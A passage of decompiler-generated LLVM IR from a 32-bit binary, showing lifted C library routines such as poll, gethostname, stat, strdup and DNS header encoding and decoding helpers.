  uselistorder i32 ()* @free, { 23, 22, 21, 20, 19, 18, 3, 2, 1, 0, 13, 12, 11, 10, 9, 24, 30, 29, 28, 17, 16, 15, 14, 6, 4, 27, 26, 25, 8, 7, 5 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @__get_hosts_byname_r, { 1, 0 }
  uselistorder label %dec_label_pc_199cc, { 8, 6, 0, 3, 7, 4, 5, 2, 1 }
  uselistorder label %dec_label_pc_199c8, { 1, 0 }
  uselistorder label %dec_label_pc_199b4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_19970, { 2, 0, 1 }
  uselistorder label %dec_label_pc_197a0, { 2, 0, 1 }
}

define i32 @__GI_poll(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_199dc = load i32, i32* @r7, align 4
  store i32 %v3_199dc, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_19a04, label %dec_label_pc_199f4

dec_label_pc_199f4:                               ; preds = %entry
  %v0_199f4 = call i32 @__GI___errno_location()
  %v0_199f8 = load i32, i32* %r7.global-to-local, align 4
  %v1_199f8 = sub i32 0, %v0_199f8
  %v2_199fc = inttoptr i32 %v0_199f4 to i32*
  store i32 %v1_199f8, i32* %v2_199fc, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_19a08.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_19a04

dec_label_pc_19a04:                               ; preds = %entry, %dec_label_pc_199f4
  %v2_19a08 = phi i32 [ %v3_199dc, %entry ], [ %v2_19a08.pre, %dec_label_pc_199f4 ]
  %v0_19a04 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_199f4 ]
  store i32 %v2_19a08, i32* @r7, align 4
  ret i32 %v0_19a04

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_19a04, { 1, 0 }
}

define i32 @__GI_gethostname(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-341 = alloca i32, align 4
  %stack_var_-406 = alloca i32, align 4
  %v2_19a1c = ptrtoint i32* %stack_var_-406 to i32
  store i32 %arg1, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v1_19a2c = call i32 @uname(i32 %v2_19a1c)
  %v7_19a30 = icmp eq i32 %v1_19a2c, -1
  br i1 %v7_19a30, label %bb, label %dec_label_pc_19a3c

bb:                                               ; preds = %entry
  store i32 %v1_19a2c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19a78

dec_label_pc_19a3c:                               ; preds = %entry
  %v2_19a3c = ptrtoint i32* %stack_var_-341 to i32
  %tmp10 = bitcast i32* %stack_var_-341 to i8*
  %v3_19a44 = call i32 @strlen(i8* %tmp10)
  %v1_19a48 = add i32 %v3_19a44, 1
  %v1_19a4c = load i32, i32* %r5.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_19a48, %v1_19a4c
  br i1 %tmp, label %dec_label_pc_19a54, label %dec_label_pc_19a68

dec_label_pc_19a54:                               ; preds = %dec_label_pc_19a3c
  %v0_19a54 = call i32 @__GI___errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_19a60 = inttoptr i32 %v0_19a54 to i32*
  store i32 22, i32* %v2_19a60, align 4
  %v0_19a78.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19a78

dec_label_pc_19a68:                               ; preds = %dec_label_pc_19a3c
  %v0_19a68 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v2_19a3c, i32* @r1, align 4
  %v2_19a70 = inttoptr i32 %v0_19a68 to i8*
  %v3_19a70 = call i32 @strcpy(i8* %v2_19a70, i32 %v2_19a3c)
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19a78

dec_label_pc_19a78:                               ; preds = %bb, %dec_label_pc_19a54, %dec_label_pc_19a68
  %v0_19a78 = phi i32 [ %v1_19a2c, %bb ], [ %v0_19a78.pre, %dec_label_pc_19a54 ], [ 0, %dec_label_pc_19a68 ]
  ret i32 %v0_19a78

; uselistorder directives
  uselistorder i32 %v2_19a3c, { 1, 0 }
  uselistorder i32 %v1_19a2c, { 1, 2, 0 }
  uselistorder i32 (i8*, i32)* @strcpy, { 5, 6, 7, 0, 1, 2, 3, 4 }
  uselistorder i32 22, { 3, 17, 4, 5, 19, 6, 7, 8, 9, 15, 10, 11, 12, 16, 13, 0, 18, 14, 1, 2 }
  uselistorder label %dec_label_pc_19a78, { 2, 1, 0 }
}

define i32 @__GI_stat(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_19ac0, label %dec_label_pc_19aac

dec_label_pc_19aac:                               ; preds = %entry
  %v0_19aac = call i32 @__GI___errno_location()
  %v0_19ab0 = load i32, i32* %r7.global-to-local, align 4
  %v1_19ab0 = sub i32 0, %v0_19ab0
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_19ab8 = inttoptr i32 %v0_19aac to i32*
  store i32 %v1_19ab0, i32* %v2_19ab8, align 4
  br label %dec_label_pc_19ad0

dec_label_pc_19ac0:                               ; preds = %entry
  %v2_19ac0 = icmp eq i32 %arg1, 0
  br i1 %v2_19ac0, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_19ac0
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_19ac0, %bb
  call void @__pseudo_cond_branch(i1 %v2_19ac0, i32 ptrtoint (i32* @global_var_17bd4.626 to i32))
  br label %dec_label_pc_19ad0

dec_label_pc_19ad0:                               ; preds = %dec_label_pc_19aac, %.thread
  %v0_19ad0 = load i32, i32* %r7.global-to-local, align 4
  ret i32 %v0_19ad0

; uselistorder directives
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_19ad0, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_19b20, label %dec_label_pc_19b0c

dec_label_pc_19b0c:                               ; preds = %entry
  %v0_19b0c = call i32 @__GI___errno_location()
  %v0_19b10 = load i32, i32* %r4.global-to-local, align 4
  %v1_19b10 = sub i32 0, %v0_19b10
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_19b18 = inttoptr i32 %v0_19b0c to i32*
  store i32 %v1_19b10, i32* %v2_19b18, align 4
  %v0_19b28.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19b28

dec_label_pc_19b20:                               ; preds = %entry
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %v2_19b20 = icmp eq i32 %arg1, 0
  br i1 %v2_19b20, label %dec_label_pc_19b34, label %dec_label_pc_19b28

dec_label_pc_19b28:                               ; preds = %dec_label_pc_19b20, %dec_label_pc_19b0c
  %v0_19b28 = phi i32 [ %arg1, %dec_label_pc_19b20 ], [ %v0_19b28.pre, %dec_label_pc_19b0c ]
  br label %dec_label_pc_19b38

dec_label_pc_19b34:                               ; preds = %dec_label_pc_19b20
  br label %dec_label_pc_19b38

dec_label_pc_19b38:                               ; preds = %dec_label_pc_19b28, %dec_label_pc_19b34
  %v1_19b40 = phi i32 [ %v0_19b28, %dec_label_pc_19b28 ], [ %tmp8, %dec_label_pc_19b34 ]
  ret i32 %v1_19b40

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_19b38, { 1, 0 }
}

define i32 @memmove(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_19b50 = load i32, i32* @r0, align 4
  %v1_19b50 = load i32, i32* @r1, align 4
  %v2_19b50 = inttoptr i32 %v0_19b50 to i8*
  %v3_19b50 = call i32 @_memcpy(i8* %v2_19b50, i32 %v1_19b50)
  ret i32 %v3_19b50

; uselistorder directives
  uselistorder i32 (i8*, i32)* @_memcpy, { 0, 2, 1 }
}

define i32 @__GI_strdup(i8* %arg1) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_19b60 = load i32, i32* @r4, align 4
  store i32 %v3_19b60, i32* %stack_var_-16, align 4
  %v9_19b60 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r6, align 4
  %v3_19b68 = call i32 @strlen(i8* %arg1)
  %v1_19b6c = add i32 %v3_19b68, 1
  store i32 %v1_19b6c, i32* @r4, align 4
  %v1_19b74 = call i32 @malloc(i32 %v1_19b6c)
  store i32 %v1_19b74, i32* %r5.global-to-local, align 4
  %v2_19b78 = icmp eq i32 %v1_19b74, 0
  br i1 %v2_19b78, label %.thread, label %bb

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v1_19b84 = xor i1 %v2_19b78, true
  call void @__pseudo_cond_branch(i1 %v1_19b84, i32 ptrtoint (i32* @global_var_11ad0.553 to i32))
  %v0_19b88 = load i32, i32* %r5.global-to-local, align 4
  %v2_19b8c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_19b8c, i32* @r4, align 4
  store i32 %v9_19b60, i32* @r6, align 4
  ret i32 %v0_19b88

; uselistorder directives
  uselistorder i32 (i32)* @malloc, { 14, 13, 12, 8, 7, 15, 16, 22, 11, 10, 9, 3, 1, 0, 21, 20, 19, 18, 17, 6, 5, 4, 2 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__encode_header(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v0_19b98 = load i32, i32* @lr, align 4
  store i32 %v0_19b98, i32* %stack_var_-4, align 4
  store i32 %tmp, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %lr.global-to-local, align 4
  %v7_19ba4 = icmp sgt i32 %arg3, 11
  br i1 %v7_19ba4, label %dec_label_pc_19bac, label %dec_label_pc_19c78

dec_label_pc_19bac:                               ; preds = %entry
  %tmp16 = inttoptr i32 %arg2 to i8*
  %v1_19bac = add i32 %tmp, 1
  %v2_19bac = inttoptr i32 %v1_19bac to i8*
  %v3_19bac = load i8, i8* %v2_19bac, align 1
  store i8 %v3_19bac, i8* %tmp16, align 1
  %v0_19bb4 = load i32, i32* %ip.global-to-local, align 4
  %v1_19bb4 = inttoptr i32 %v0_19bb4 to i32*
  %v2_19bb4 = load i32, i32* %v1_19bb4, align 4
  %v1_19bb8 = trunc i32 %v2_19bb4 to i8
  %v4_19bb8 = add i32 %arg2, 1
  %v5_19bb8 = inttoptr i32 %v4_19bb8 to i8*
  store i8 %v1_19bb8, i8* %v5_19bb8, align 1
  %v0_19bbc = load i32, i32* %ip.global-to-local, align 4
  %v1_19bbc = add i32 %v0_19bbc, 8
  %v2_19bbc = inttoptr i32 %v1_19bbc to i32*
  %v3_19bbc = load i32, i32* %v2_19bbc, align 4
  %v1_19bc0 = add i32 %v0_19bbc, 20
  %v2_19bc0 = inttoptr i32 %v1_19bc0 to i32*
  %v3_19bc0 = load i32, i32* %v2_19bc0, align 4
  %v1_19bc4 = add i32 %v0_19bbc, 4
  %v2_19bc4 = inttoptr i32 %v1_19bc4 to i32*
  %v3_19bc4 = load i32, i32* %v2_19bc4, align 4
  %v1_19bc8 = add i32 %v0_19bbc, 12
  %v2_19bc8 = inttoptr i32 %v1_19bc8 to i32*
  %v3_19bc8 = load i32, i32* %v2_19bc8, align 4
  %v2_19bcc = icmp eq i32 %v3_19bc0, 0
  br i1 %v2_19bcc, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_19bac
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_19bac, %bb
  %v0_19bdc = phi i32 [ 0, %dec_label_pc_19bac ], [ 1, %bb ]
  %v1_19bd4 = urem i32 %v3_19bbc, 16
  %v2_19bd8 = icmp eq i32 %v3_19bc4, 0
  %v4_19bdc = mul nuw nsw i32 %v1_19bd4, 8
  %v5_19bdc = or i32 %v0_19bdc, %v4_19bdc
  %v1_19be0 = add i32 %v0_19bbc, 16
  %v2_19be0 = inttoptr i32 %v1_19be0 to i32*
  %v3_19be0 = load i32, i32* %v2_19be0, align 4
  %. = select i1 %v2_19bd8, i32 0, i32 128
  %v2_19bec = icmp eq i32 %v3_19bc8, 0
  %storemerge11 = select i1 %v2_19bec, i32 0, i32 4
  %v2_19bf8 = or i32 %v5_19bdc, %.
  %v2_19bfc = icmp eq i32 %v3_19be0, 0
  %.26 = select i1 %v2_19bfc, i32 0, i32 2
  %v2_19c08 = or i32 %v2_19bf8, %storemerge11
  %v2_19c0c = or i32 %v2_19c08, %.26
  %v1_19c10 = trunc i32 %v2_19c0c to i8
  %v2_19c10 = load i32, i32* %lr.global-to-local, align 4
  %v3_19c10 = add i32 %v2_19c10, 2
  %v4_19c10 = inttoptr i32 %v3_19c10 to i8*
  store i8 %v1_19c10, i8* %v4_19c10, align 1
  %v0_19c14 = load i32, i32* %ip.global-to-local, align 4
  %v1_19c14 = add i32 %v0_19c14, 24
  %v1_19c18 = inttoptr i32 %v1_19c14 to i32*
  %v2_19c18 = load i32, i32* %v1_19c18, align 4
  %v3_19c18 = add i32 %v0_19c14, 28
  %v4_19c18 = inttoptr i32 %v3_19c18 to i32*
  %v5_19c18 = load i32, i32* %v4_19c18, align 4
  %v2_19c1c = icmp eq i32 %v2_19c18, 0
  %v1_19c20 = urem i32 %v5_19c18, 16
  %v0_19c2c = select i1 %v2_19c1c, i32 0, i32 128
  %v2_19c2c = or i32 %v1_19c20, %v0_19c2c
  %v1_19c30 = trunc i32 %v2_19c2c to i8
  %v2_19c30 = load i32, i32* %lr.global-to-local, align 4
  %v3_19c30 = add i32 %v2_19c30, 3
  %v4_19c30 = inttoptr i32 %v3_19c30 to i8*
  store i8 %v1_19c30, i8* %v4_19c30, align 1
  %v0_19c34 = load i32, i32* %ip.global-to-local, align 4
  %v1_19c34 = add i32 %v0_19c34, 33
  %v2_19c34 = inttoptr i32 %v1_19c34 to i8*
  %v3_19c34 = load i8, i8* %v2_19c34, align 1
  %v2_19c38 = load i32, i32* %lr.global-to-local, align 4
  %v3_19c38 = add i32 %v2_19c38, 4
  %v4_19c38 = inttoptr i32 %v3_19c38 to i8*
  store i8 %v3_19c34, i8* %v4_19c38, align 1
  %v0_19c3c = load i32, i32* %ip.global-to-local, align 4
  %v1_19c3c = add i32 %v0_19c3c, 32
  %v2_19c3c = inttoptr i32 %v1_19c3c to i32*
  %v3_19c3c = load i32, i32* %v2_19c3c, align 4
  %v1_19c40 = trunc i32 %v3_19c3c to i8
  %v2_19c40 = load i32, i32* %lr.global-to-local, align 4
  %v3_19c40 = add i32 %v2_19c40, 5
  %v4_19c40 = inttoptr i32 %v3_19c40 to i8*
  store i8 %v1_19c40, i8* %v4_19c40, align 1
  %v0_19c44 = load i32, i32* %ip.global-to-local, align 4
  %v1_19c44 = add i32 %v0_19c44, 37
  %v2_19c44 = inttoptr i32 %v1_19c44 to i8*
  %v3_19c44 = load i8, i8* %v2_19c44, align 1
  %v2_19c48 = load i32, i32* %lr.global-to-local, align 4
  %v3_19c48 = add i32 %v2_19c48, 6
  %v4_19c48 = inttoptr i32 %v3_19c48 to i8*
  store i8 %v3_19c44, i8* %v4_19c48, align 1
  %v0_19c4c = load i32, i32* %ip.global-to-local, align 4
  %v1_19c4c = add i32 %v0_19c4c, 36
  %v2_19c4c = inttoptr i32 %v1_19c4c to i32*
  %v3_19c4c = load i32, i32* %v2_19c4c, align 4
  %v1_19c50 = trunc i32 %v3_19c4c to i8
  %v2_19c50 = load i32, i32* %lr.global-to-local, align 4
  %v3_19c50 = add i32 %v2_19c50, 7
  %v4_19c50 = inttoptr i32 %v3_19c50 to i8*
  store i8 %v1_19c50, i8* %v4_19c50, align 1
  %v0_19c54 = load i32, i32* %ip.global-to-local, align 4
  %v1_19c54 = add i32 %v0_19c54, 41
  %v2_19c54 = inttoptr i32 %v1_19c54 to i8*
  %v3_19c54 = load i8, i8* %v2_19c54, align 1
  %v2_19c58 = load i32, i32* %lr.global-to-local, align 4
  %v3_19c58 = add i32 %v2_19c58, 8
  %v4_19c58 = inttoptr i32 %v3_19c58 to i8*
  store i8 %v3_19c54, i8* %v4_19c58, align 1
  %v0_19c5c = load i32, i32* %ip.global-to-local, align 4
  %v1_19c5c = add i32 %v0_19c5c, 40
  %v2_19c5c = inttoptr i32 %v1_19c5c to i32*
  %v3_19c5c = load i32, i32* %v2_19c5c, align 4
  %v1_19c60 = trunc i32 %v3_19c5c to i8
  %v2_19c60 = load i32, i32* %lr.global-to-local, align 4
  %v3_19c60 = add i32 %v2_19c60, 9
  %v4_19c60 = inttoptr i32 %v3_19c60 to i8*
  store i8 %v1_19c60, i8* %v4_19c60, align 1
  %v0_19c64 = load i32, i32* %ip.global-to-local, align 4
  %v1_19c64 = add i32 %v0_19c64, 45
  %v2_19c64 = inttoptr i32 %v1_19c64 to i8*
  %v3_19c64 = load i8, i8* %v2_19c64, align 1
  %v2_19c68 = load i32, i32* %lr.global-to-local, align 4
  %v3_19c68 = add i32 %v2_19c68, 10
  %v4_19c68 = inttoptr i32 %v3_19c68 to i8*
  store i8 %v3_19c64, i8* %v4_19c68, align 1
  %v0_19c6c = load i32, i32* %ip.global-to-local, align 4
  %v1_19c6c = add i32 %v0_19c6c, 44
  %v2_19c6c = inttoptr i32 %v1_19c6c to i32*
  %v3_19c6c = load i32, i32* %v2_19c6c, align 4
  %v1_19c70 = trunc i32 %v3_19c6c to i8
  %v2_19c70 = load i32, i32* %lr.global-to-local, align 4
  %v3_19c70 = add i32 %v2_19c70, 11
  %v4_19c70 = inttoptr i32 %v3_19c70 to i8*
  store i8 %v1_19c70, i8* %v4_19c70, align 1
  %v2_19c78.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_19c78

dec_label_pc_19c78:                               ; preds = %entry, %bb17
  %v2_19c78 = phi i32 [ %v2_19c78.pre, %bb17 ], [ %v0_19b98, %entry ]
  %storemerge = phi i32 [ 12, %bb17 ], [ -1, %entry ]
  store i32 %v2_19c78, i32* @lr, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_19bbc, { 0, 2, 1, 3, 4 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 45, { 3, 2, 0, 4, 1 }
  uselistorder i32 37, { 2, 0, 1 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_19c78, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__decode_header(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_19c80 = load i8, i8* %arg1, align 1
  %v4_19c80 = zext i8 %v3_19c80 to i32
  %v2_19c84 = add i32 %tmp, 1
  %v3_19c84 = inttoptr i32 %v2_19c84 to i8*
  %v4_19c84 = load i8, i8* %v3_19c84, align 1
  %v5_19c84 = zext i8 %v4_19c84 to i32
  %v4_19c88 = mul nuw nsw i32 %v4_19c80, 256
  %v5_19c88 = or i32 %v5_19c84, %v4_19c88
  %v2_19c8c = inttoptr i32 %arg2 to i32*
  store i32 %v5_19c88, i32* %v2_19c8c, align 4
  %v2_19c90 = add i32 %tmp, 2
  %v3_19c90 = inttoptr i32 %v2_19c90 to i8*
  %v4_19c90 = load i8, i8* %v3_19c90, align 1
  %tmp3 = icmp slt i8 %v4_19c90, 0
  %v3_19c94 = zext i1 %tmp3 to i32
  %v2_19c98 = add i32 %arg2, 4
  %v3_19c98 = inttoptr i32 %v2_19c98 to i32*
  store i32 %v3_19c94, i32* %v3_19c98, align 4
  %v4_19c9c = load i8, i8* %v3_19c90, align 1
  %div = udiv i8 %v4_19c9c, 8
  %tmp4 = urem i8 %div, 16
  %v1_19ca4 = zext i8 %tmp4 to i32
  %v2_19ca8 = add i32 %arg2, 8
  %v3_19ca8 = inttoptr i32 %v2_19ca8 to i32*
  store i32 %v1_19ca4, i32* %v3_19ca8, align 4
  %v4_19cac = load i8, i8* %v3_19c90, align 1
  %div1 = udiv i8 %v4_19cac, 4
  %tmp5 = urem i8 %div1, 2
  %v1_19cb4 = zext i8 %tmp5 to i32
  %v2_19cb8 = add i32 %arg2, 12
  %v3_19cb8 = inttoptr i32 %v2_19cb8 to i32*
  store i32 %v1_19cb4, i32* %v3_19cb8, align 4
  %v4_19cbc = load i8, i8* %v3_19c90, align 1
  %div2 = udiv i8 %v4_19cbc, 2
  %tmp6 = urem i8 %div2, 2
  %v1_19cc4 = zext i8 %tmp6 to i32
  %v2_19cc8 = add i32 %arg2, 16
  %v3_19cc8 = inttoptr i32 %v2_19cc8 to i32*
  store i32 %v1_19cc4, i32* %v3_19cc8, align 4
  %v4_19ccc = load i8, i8* %v3_19c90, align 1
  %tmp7 = urem i8 %v4_19ccc, 2
  %v1_19cd0 = zext i8 %tmp7 to i32
  %v2_19cd4 = add i32 %arg2, 20
  %v3_19cd4 = inttoptr i32 %v2_19cd4 to i32*
  store i32 %v1_19cd0, i32* %v3_19cd4, align 4
  %v2_19cd8 = add i32 %tmp, 3
  %v3_19cd8 = inttoptr i32 %v2_19cd8 to i8*
  %v4_19cd8 = load i8, i8* %v3_19cd8, align 1
  %tmp8 = icmp slt i8 %v4_19cd8, 0
  %v3_19cdc = zext i1 %tmp8 to i32
  %v2_19ce0 = add i32 %arg2, 24
  %v3_19ce0 = inttoptr i32 %v2_19ce0 to i32*
  store i32 %v3_19cdc, i32* %v3_19ce0, align 4
  %v4_19ce4 = load i8, i8* %v3_19cd8, align 1
  %tmp9 = urem i8 %v4_19ce4, 16
  %v1_19ce8 = zext i8 %tmp9 to i32
  %v2_19cec = add i32 %arg2, 28
  %v3_19cec = inttoptr i32 %v2_19cec to i32*
  store i32 %v1_19ce8, i32* %v3_19cec, align 4
  %v2_19cf0 = add i32 %tmp, 4
  %v3_19cf0 = inttoptr i32 %v2_19cf0 to i8*
  %v4_19cf0 = load i8, i8* %v3_19cf0, align 1
  %v5_19cf0 = zext i8 %v4_19cf0 to i32
  %v2_19cf4 = add i32 %tmp, 5
  %v3_19cf4 = inttoptr i32 %v2_19cf4 to i8*
  %v4_19cf4 = load i8, i8* %v3_19cf4, align 1
  %v5_19cf4 = zext i8 %v4_19cf4 to i32
  %v4_19cf8 = mul nuw nsw i32 %v5_19cf0, 256
  %v5_19cf8 = or i32 %v5_19cf4, %v4_19cf8
  %v2_19cfc = add i32 %arg2, 32
  %v3_19cfc = inttoptr i32 %v2_19cfc to i32*
  store i32 %v5_19cf8, i32* %v3_19cfc, align 4
  %v2_19d00 = add i32 %tmp, 6
  %v3_19d00 = inttoptr i32 %v2_19d00 to i8*
  %v4_19d00 = load i8, i8* %v3_19d00, align 1
  %v5_19d00 = zext i8 %v4_19d00 to i32
  %v2_19d04 = add i32 %tmp, 7
  %v3_19d04 = inttoptr i32 %v2_19d04 to i8*
  %v4_19d04 = load i8, i8* %v3_19d04, align 1
  %v5_19d04 = zext i8 %v4_19d04 to i32
  %v4_19d08 = mul nuw nsw i32 %v5_19d00, 256
  %v5_19d08 = or i32 %v5_19d04, %v4_19d08
  %v2_19d0c = add i32 %arg2, 36
  %v3_19d0c = inttoptr i32 %v2_19d0c to i32*
  store i32 %v5_19d08, i32* %v3_19d0c, align 4
  %v2_19d10 = add i32 %tmp, 8
  %v3_19d10 = inttoptr i32 %v2_19d10 to i8*
  %v4_19d10 = load i8, i8* %v3_19d10, align 1
  %v5_19d10 = zext i8 %v4_19d10 to i32
  %v2_19d14 = add i32 %tmp, 9
  %v3_19d14 = inttoptr i32 %v2_19d14 to i8*
  %v4_19d14 = load i8, i8* %v3_19d14, align 1
  %v5_19d14 = zext i8 %v4_19d14 to i32
  %v4_19d18 = mul nuw nsw i32 %v5_19d10, 256
  %v5_19d18 = or i32 %v5_19d14, %v4_19d18
  %v2_19d1c = add i32 %arg2, 40
  %v3_19d1c = inttoptr i32 %v2_19d1c to i32*
  store i32 %v5_19d18, i32* %v3_19d1c, align 4
  %v2_19d20 = add i32 %tmp, 11
  %v3_19d20 = inttoptr i32 %v2_19d20 to i8*
  %v4_19d20 = load i8, i8* %v3_19d20, align 1
  %v5_19d20 = zext i8 %v4_19d20 to i32
  %v2_19d24 = add i32 %tmp, 10
  %v3_19d24 = inttoptr i32 %v2_19d24 to i8*
  %v4_19d24 = load i8, i8* %v3_19d24, align 1
  %v5_19d24 = zext i8 %v4_19d24 to i32
  %v4_19d28 = mul nuw nsw i32 %v5_19d24, 256
  %v5_19d28 = or i32 %v4_19d28, %v5_19d20
  %v2_19d2c = add i32 %arg2, 44
  %v3_19d2c = inttoptr i32 %v2_19d2c to i32*
  store i32 %v5_19d28, i32* %v3_19d2c, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 44, { 12, 13, 10, 11, 2, 14, 9, 37, 1, 3, 21, 22, 23, 24, 25, 26, 18, 19, 20, 15, 16, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 0, 4, 17, 5, 6, 7, 8 }
  uselistorder i32 11, { 19, 20, 7, 8, 9, 10, 11, 21, 22, 12, 4, 5, 6, 13, 14, 15, 16, 17, 18, 0, 3, 2, 1 }
  uselistorder i32 40, { 12, 13, 16, 1, 6, 14, 17, 2, 15, 4, 3, 0, 7, 8, 9, 10, 11, 5 }
  uselistorder i32 36, { 29, 30, 33, 34, 35, 36, 10, 5, 9, 31, 11, 25, 12, 26, 13, 2, 6, 32, 14, 15, 16, 17, 0, 3, 7, 18, 19, 4, 20, 21, 27, 28, 22, 23, 8, 1, 24 }
  uselistorder i32 7, { 21, 22, 16, 0, 11, 12, 1, 2, 23, 18, 19, 20, 3, 4, 5, 6, 17, 7, 13, 14, 8, 9, 15, 10 }
  uselistorder i32 28, { 49, 6, 8, 52, 7, 55, 56, 61, 63, 64, 9, 10, 62, 11, 12, 57, 37, 50, 51, 30, 13, 31, 14, 66, 48, 65, 15, 1, 38, 16, 17, 18, 3, 19, 53, 54, 2, 58, 59, 39, 40, 41, 42, 43, 44, 45, 0, 46, 32, 60, 33, 34, 35, 4, 5, 36, 28, 24, 23, 21, 22, 29, 25, 26, 47, 20, 27 }
  uselistorder i8 2, { 1, 2, 3, 4, 0, 5 }
  uselistorder i8 4, { 2, 0, 1 }
  uselistorder i8 16, { 2, 3, 0, 4, 1, 5 }
  uselistorder i8 8, { 1, 0 }
  uselistorder i32 %arg2, { 3, 0, 8, 1, 6, 2, 10, 11, 7, 9, 4, 5 }
}

define i32 @__encode_question(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r2, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_19d34 = load i32, i32* @r4, align 4
  store i32 %v3_19d34, i32* %stack_var_-16, align 4
  %v9_19d34 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_19d3c = load i32, i32* %arg1, align 4
  store i32 %v2_19d3c, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  %v1_19d48 = inttoptr i32 %v2_19d3c to i8*
  %v2_19d48 = call i32 @__encode_dotted(i8* %v1_19d48)
  store i32 %v2_19d48, i32* %r0.global-to-local, align 4
  %v1_19d4c = icmp slt i32 %v2_19d48, 0
  br i1 %v1_19d4c, label %dec_label_pc_19d8c, label %dec_label_pc_19d54

dec_label_pc_19d54:                               ; preds = %entry
  %v1_19d54 = load i32, i32* @r5, align 4
  %v2_19d54 = sub i32 %v1_19d54, %v2_19d48
  %v7_19d5c = icmp slt i32 %v2_19d54, 4
  br i1 %v7_19d5c, label %bb, label %dec_label_pc_19d64

bb:                                               ; preds = %dec_label_pc_19d54
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19d8c

dec_label_pc_19d64:                               ; preds = %dec_label_pc_19d54
  %v0_19d64 = load i32, i32* @r4, align 4
  %v1_19d64 = add i32 %v0_19d64, 5
  %v2_19d64 = inttoptr i32 %v1_19d64 to i8*
  %v3_19d64 = load i8, i8* %v2_19d64, align 1
  %v2_19d68 = load i32, i32* @r6, align 4
  %v4_19d68 = add i32 %v2_19d68, %v2_19d48
  %v5_19d68 = inttoptr i32 %v4_19d68 to i8*
  store i8 %v3_19d64, i8* %v5_19d68, align 1
  %v0_19d6c = load i32, i32* @r4, align 4
  %v1_19d6c = add i32 %v0_19d6c, 4
  %v2_19d6c = inttoptr i32 %v1_19d6c to i32*
